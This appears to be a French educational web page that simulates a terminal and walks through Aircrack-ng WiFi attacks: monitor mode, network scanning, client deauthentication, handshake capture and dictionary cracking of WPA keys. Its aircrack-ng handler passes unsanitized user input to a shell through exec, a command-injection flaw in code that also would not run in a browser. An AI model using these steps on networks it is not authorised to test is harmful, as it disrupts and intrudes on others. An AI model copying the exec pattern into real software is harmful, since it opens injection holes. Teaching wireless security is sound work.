<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aircrack-ng Projet Partage</title>
    <div id="cotpan" class="cot_pan">
    <button id="pannbtn" class="topanbtn" onclick="toPann()">☰</button>
    <div id="tutocont"></div>
</div>
    <style>

.cot_pan {
    position: fixed;
    left: -350px;
    top: 0;
    width: 350px;
    height: 100%;
    background-color: #333;
    color: white;
    overflow-y: auto;
    transition: 0.3s;
    padding-top: 20px;
    z-index: 10000;
}

.topanbtn {
    position: fixed;
    left: 10px;
    top: 10px;
    background-color: #61952e;
    color: white;
    border: none;
    padding: 10px;
    cursor: pointer;
    z-index: 10001;
    border-radius: 5px;
}

.cot_pan .infobul {
    position: static;
    background-color: #4b4b4b;
    margin: 10px;
    padding: 15px;
    border-radius: 10px;
}

.cot_pan h2 {
    font-size: 14px;
    margin-bottom: 8px;
}

.cot_pan p, .cot_pan code {
    font-size: 12px;
}

.cot_pan img {
    max-width: 100%;
    height: auto;
    margin-top: 10px;
}

    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
        body {
    font-family: monospace, sans-serif;
    background-color: #1e1e1e;
    color: white;
    margin: 0;
    padding: 0;
    overflow: hidden;
}

#terminal {
    width: 100%;
    height: 80vh; 
    padding: 20px;
    overflow-y: scroll;
    border-bottom: 2px solid #fff;
}

#input-container {
    display: flex;
    justify-content: flex-start;
    padding: 10px;
}

#input-container input {
    background-color: #61952e;
    color: white;
    border: none;
    border-radius: 5px;
    padding: 10px;
    width: 100%;
    font-size: 16px;
    outline: none;
}

#input-container input:focus {
    border: 2px solid #4CAF50;
}

.infobul {
    position: absolute;
    background-color: #61952e;
    color: white;
    padding: 15px;
    border-radius: 10px;
    max-width: 90%;
    z-index: 9999;
    top: 20px;
    right: 10px;
    font-family: Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    cursor: move;
    resize: both; 
    overflow: auto;
    min-width: 100px;
    min-height: 70px; 
}

.infobul:after {
    content: '';
    position: absolute;
    right: 5px;
    bottom: 5px;
    width: 15px;
    height: 15px;
    background-color: rgba(0, 0, 0, 0.3);
    cursor: se-resize;
}

.infobul h2 {
    margin: 0;
    font-size: 10px;
    font-weight: bold;
    word-wrap: break-word;
}

.infobul p {
    margin: 10px 0;
    font-size: 8px;
    word-wrap: break-word;
}

codee {
    background-color: #333;
    color: #f8f8f2;
    padding: 10px;
    border-radius: 5px;
    white-space: codee-wrap;
    word-wrap: break-word;
    font-size: 8px;
    width: 100%;
    margin: 10px 0;
}


.infobul-image {
    max-width: 100%;
    height: auto;
    margin: 10px 0;
}

.close-btn {
    position: absolute;
    top: 5px;
    right: 5px;
    background-color: red;
    color: white;
    border: none;
    border-radius: 50%;
    padding: 5px;
    cursor: pointer;
}

@media screen and (max-width: 600px) {

    #terminal {
        height: 70vh; 
    }


    .infobul h2 {
        font-size: 18px;
    }
    .infobul p {
        font-size: 14px;
    }
    codee {
        font-size: 14px; 
    }

    .infobul-image {
        max-width: 100%;
        height: auto;
    }
}


@media screen and (max-width: 400px) {
    .infobul {
        max-width: 95%; 
    }

    .infobul h2 {
        font-size: 16px;
    }
    .infobul p {
        font-size: 12px;
    }
    codee {
        font-size: 12px;
    }
}
        
        
        
        
    </style>
</head>
<body>
    <div id="terminal"></div>
    <div id="input-container">
        <input type="text" id="command-input" placeholder="Entrer une commande..." autofocus />
    </div>

    <script>
        const ResO = [
            { bssid: 'E8:15:17:01:23:47', channel: 6, signal: -45, essid: 'Poubel-WIFI', clients: [
                { mac: '11:12:16:26:31:23', ip: '192.168.1.16' },
                { mac: '22:00:14:22:01:24', ip: '192.168.1.45' }
            ]},
            { bssid: 'B3:14:32:07:23:44', channel: 11, signal: -50, essid: 'mange-ma-CO', clients: [
                { mac: '38:00:19:23:01:25', ip: '192.168.1.41' }
            ]},
            { bssid: 'E2:17:45:32:00:17', channel: 11, signal: -62, essid: 'D-fonss-ET_88', clients: [
                { mac: '02:44:61:62:13:32', ip: '192.168.1.11' },
                { mac: '22:00:41:22:10:42', ip: '192.168.1.10' }
            ]},
        ];

        let supUt = false;
        let MonMod = false;
        let interactu = 'wlan0';
        let Monint = 'wlan0mon';

        const terminal = document.getElementById("terminal");
        const entre_input = document.getElementById("command-input");

        function print_Term(message) {
            const p = document.createElement("p");
            p.textContent = message;
            terminal.appendChild(p);
            terminal.scrollTop = terminal.scrollHeight;
        }

        function executeCom(command) {
            const cmd = command.trim().toLowerCase();
            
            if (cmd === "sudo su") {
                if (supUt) {
                    print_Term("Vous êtes déjà en mode superutilisateur.");
                } else {
                    supUt = true;
                    print_Term("Mode superutilisateur activé.");
                }
            } 
            else if (cmd === "exit") {
                if (supUt) {
                    supUt = false;
                    print_Term("Mode superutilisateur désactivé.");
                } else {
                    print_Term("Fermeture du terminal.");
                }
            }
            else if (cmd === "iwconfig") {
                print_Term(MonMod ? `${Monint}  Mode: Monitor` : `${interactu}  Mode: Managed`);
            }
            else if (cmd === "ifconfig") {
                print_Term(`${interactu}  Link encap:Ethernet  HWaddr 00:11:22:33:44:55\n          inet6 addr: fe80::21b:43ff:fe23:4d6/64 Scope:Link\n          UP`);
                if (MonMod) {
                    print_Term(`${Monint}  Link encap:Ethernet  HWaddr 00:11:22:33:44:56\n          inet6 addr: fe80::21b:43ff:fe23:4d7/64 Scope:Link\n          UP`);
                }
            }
            else if (cmd.startsWith("airmon-ng start wlan0")) {
                if (MonMod) {
                    print_Term("wlan0mon est déjà en mode moniteur.");
                } else {
                    MonMod = true;
                    print_Term("Mode moniteur activé sur wlan0.");
                }
            }
            else if (cmd.startsWith("airmon-ng stop wlan0mon")) {
                if (!MonMod) {
                    print_Term("Le mode moniteur n'est pas activé.");
                } else {
                    MonMod = false;
                    print_Term("Mode moniteur désactivé sur wlan0mon.");
                }
            }
            else if (cmd === "airodump-ng wlan0mon") {
                if (!MonMod) {
                    print_Term("Erreur: L'interface wlan0 doit être en mode moniteur pour exécuter cette commande.");
                } else {
                    print_Term("Scan des réseaux WiFi... Voici les résultats :");
                    ResO.forEach(reso => {
                        print_Term(`${reso.bssid}  Canal ${reso.channel}  Signal: ${reso.signal} dBm  ESSID: ${reso.essid}`);
                    });
                }
            }
            else if (cmd.startsWith("airodump-ng --bssid")) {
    const match = cmd.match(/--bssid ([\w:]+)\s+(\S+)/);
    if (!match) {
        print_Term("Erreur: Format de commande invalide. Assurez-vous d'utiliser --bssid <BSSID> <interface>.");
    } else {
        const bssid = match[1]; 
        const Nom_inter = match[2]; 


        const True_Inter = Nom_inter === "wlan0mon" || Nom_inter === "wlan1mon"; 

        if (!True_Inter) {
            print_Term(`Erreur: L'interface ${Nom_inter} n'est pas en mode moniteur.`);
            return;
        }

        const reso = ResO.find(n => n.bssid === bssid);
        if (reso) {
            print_Term(`Affichage des détails du réseau avec BSSID ${bssid}...`);
            print_Term(`BSSID              Canal  Signal  ESSID\n${reso.bssid}  ${reso.channel}  ${reso.signal} dBm  ${reso.essid}`);
            print_Term("Clients détectés :");
            reso.clients.forEach(client => {
                print_Term(`MAC: ${client.mac}  IP: ${client.ip}`);
            });
        } else {
            print_Term("BSSID non trouvé.");
        }
    }
}

            else if (cmd.startsWith("airodump-ng wlan0mon --channel")) {
                const match = cmd.match(/--channel (\d+) --bssid ([\w:]+) -w (\S+)/);
                if (match) {
                    const [_, channel, bssid, fichiercap] = match;
                    const reso = ResO.find(n => n.bssid === bssid);
                    if (reso) {
                        print_Term(`Exécution de airodump-ng sur le canal ${channel} pour le BSSID ${bssid}, avec enregistrement dans ${fichiercap}.cap`);
                        print_Term(`Scan du réseau ${reso.essid} (BSSID: ${bssid}, Canal: ${reso.channel}, Signal: ${reso.signal} dBm)...`);
                    } else {
                        print_Term("BSSID non trouvé pour cette commande.");
                    }
                } else {
                    print_Term("Commande airodump-ng mal formée. Vérifiez la syntaxe.");
                }
            }
            else if (cmd.startsWith("aireplay-ng -0")) {
                if (!MonMod) {
                    print_Term("Erreur: L'interface wlan0mon doit être en mode moniteur.");
                } else {
                    const match = cmd.match(/-0 (\d+) -a ([\w:]+) -c ([\w:]+)/);
                    if (match) {
                        const [_, paquet, bssid, addrmaccible] = match;
                        print_Term(`Envoi de ${paquet} paquets de désauthentification vers ${bssid} (${addrmaccible})...`);
                    } else {
                        print_Term("Commande aireplay-ng incorrecte.");
                    }
                }
            }
            else if (cmd.startsWith("aircrack-ng")) {
    const parts = cmd.split(" ");
    let fichdico = null;
    let bssid = null;
    let fichcap = null;

    parts.forEach((part, index) => {
        if (part === "-w" && parts[index + 1]) {
            fichdico = parts[index + 1];
        } else if (part === "-b" && parts[index + 1]) {
            bssid = parts[index + 1];
        } else if (part.endsWith(".cap")) {
            fichcap = part;
        }
    });

    if (!fichdico) {
        print_Term("Erreur: Fichier dictionnaire (-w) non spécifié.");
    } else if (!bssid) {
        print_Term("Erreur: BSSID (-b) non spécifié.");
    } else if (!fichcap) {
        print_Term("Erreur: Fichier de capture (.cap) non spécifié.");
    } else {
        print_Term(`Tentative de craquage du mot de passe WPA avec le fichier ${fichcap}...\n`);
        
        const fs = require('fs');
        if (fs.existsSync(fichdico) && fs.existsSync(fichcap)) {
            const command = `aircrack-ng -w ${fichdico} -b ${bssid} ${fichcap}`;
            const { exec } = require('child_process');
            exec(command, (error, stdout, stderr) => {
                if (error) {
                    print_Term(`Erreur d'exécution: ${error.message}`);
                    return;
                }
                if (stderr) {
                    print_Term(`Erreur: ${stderr}`);
                    return;
                }
                print_Term(`Résultat de aircrack-ng :\n${stdout}`);
            });
        } else {
            print_Term("Erreur: Un des fichiers spécifiés est manquant.");
        }
    }
}
 else {
                print_Term(`Commande non reconnue: ${cmd}`);
            }
        }

entre_input.addEventListener("focus", function() {
    entre_input.scrollIntoView({ behavior: "smooth", block: "center" });
});

        entre_input.addEventListener("keydown", function(event) {
            if (event.key === "Enter") {
                const command = entre_input.value.trim();
                print_Term("$ " + command);
                executeCom(command);
                entre_input.value = ""; 
            }
        });

        entre_input.focus();
        
        
        
        
        
        
        
        
        
        
        

        const etapebulle = [
          {
        chap: "Informations Diverses",
        text: "Cette page imparfaite a pour but de découvrir une introduction au Pentest (Test d'intrusion) de façon éthique, ludique et accessible par toustes quelque soit l'expérience en informatique. Nous introduisons ici une initiation simplifiée de l'outil Aircrack-ng (disponible sur Windows, Linux, et macOS) pour comcodeendre les grande étape comme : passer sa carte WIFI en mode moniteur, analyser le réseau, désauthentifier, capturer des paquets, ou encore déchiffrer une clé. C'est une démonstration générale qui se veut simplifier les concepts dans les grandes lignes, pour aller plus loin, il faut consulter la nombreuse documentation web.  <br><br> Ici nous travaillerons sur la syntaxe d'Aircrack-ng sous Linux avec une tentative de reproduction d'invite de commande très basique. <br><br> Il n'est pas necessaire de rappeler que ce projet est à but éducatif officiellement portant sur la sécurité de nos réseaux WIFI restant dans un cadre éthique.",
        image: null
    },
    {
        chap: "1. Privilège superutilisateur",
        text: [
            "Passer en mode superutilisateur avec cette commande afin d'avoir la pleine utilisation de la machine :",
            "sudo su",
            "Puis, on regarde le nom de l'interface réseau que l'on a  :",
            "iwconfig",
            "Ou :",
            "ifconfig",
            "Ici on aura wlan0, cela dépend de la machine."
        ],
        code: null,
        image: null
    },
    {
        chap: "2. Carte WIFI en mode moniteur",
        text: ["De base, la carte WIFI est en mode managed, c'est à dire qu'elle ne reçoit que les paquets qui doivent parvenir à l'adresse MAC de la machine.<br>Le mode monitor capte tous les paquets qui se trouvent à portée de la machine.<br><br>Alors il faut activer le mode moniteur sur la carte WIFI pour surveiller/écouter les réseaux :",
        "airmon-ng start wlan0","Pour remettre en managed, on remplacera start par stop :","airmon-ng stop wlan0", 
        "On peut refaire un ifconfig ou iwconfig."],
        image: null
    },
    {
        chap: "3. Scan de réseaux",
        text:[ "Scannez les réseaux WiFi à proximité pour choisir une cible (on utilisera désormais notre carte en moniteur) :",
      "airodump-ng wlan0mon",
        "On peut regarder les appareils connecté à un réseau cible :",
        "sudo airodump-ng wlan0mon --channel ^numéro canal^ --bssid ^bssid cible^"],
        image: null
    },
    {
        chap: "4. Déauthentification/Capture de paquet",
        text: ["Effectuez une attaque de déauthentification pour déconnecter un client spécifique :",
       "aireplay-ng -0 ^nb de désauth^ -a ^bssid cible^ -c ^machine connecté au bssid cible^ wlan0mon",
        "Pour capturer des paquets du reseau cible : ",
        "airodump-ng wlan0mon --channel ^numéro canal^ --bssid ^bssid cible^ -w ^nom-fichier-capture^"],
        image: null
    },
    {
        chap: "5. Crack du mot de passe",
        text:  "aircrack-ng pour tentative de crack le mot de passe avec un fichier dico de mdp :",
        code: "aircrack-ng -w ^dico-mdp.txt^ -b ^bssid cible^ ^fichier-capture.cap^",
        image: null
    }
];



let tutorialInd = 0;

function toPann() {
    const cotpan = document.getElementById("cotpan");
    if (cotpan.style.left === "0px") {
        cotpan.style.left = "-350px"; 
    } else {
        cotpan.style.left = "0px"; 
    }
}

function affichbul() {
    const tutocont = document.getElementById("tutocont");
    tutocont.innerHTML = ""; 

    etapebulle.forEach((etape, index) => {
        const etapeHtml = `
            <div class="infobul" id="tutorial-step-${index}">
                <h2>${etape.chap}</h2>
                ${Array.isArray(etape.text)
                    ? etape.text.map(item => {
                        if (item.includes("iwconfig") || item.includes("ifconfig") ||  item.includes("airmon-ng start wlan0") || item.includes("airmon-ng stop wlan0") || item.includes("sudo airodump-ng wlan0mon --channel ^numéro canal^ --bssid ^bssid cible^") ||  item.includes("airodump-ng wlan0mon") || item.includes("aireplay-ng -0 ^nb de désauth^ -a ^bssid cible^ -c <machine connecté au bssid cible> wlan0mon") ||  item.includes("airodump-ng wlan0mon --channel  ^numéro canal^ --bssid ^bssid cible^ -w ^nom fichier capture^") || item.includes("aircrack-ng -w ^dico-mdp.txt^ -b ^bssid cible^ ^fichier-capture.cap^")) {
                            return `<codee><code>${item}</code></codee>`;
                        } else {
                            return `<p>${item}</p>`;
                        }
                    }).join('')
                    : `<p>${etape.text}</p>`}
                ${etape.image ? `<img src="${etape.image}" alt="Image explicative" class="infobul-image">` : ''}
                ${etape.code ? `<codee><code>${etape.code}</code></codee>` : ''}
            </div>
        `;
        tutocont.insertAdjacentHTML('beforeend', etapeHtml);
    });
}

affichbul();




    </script>
  
</body>
</html>
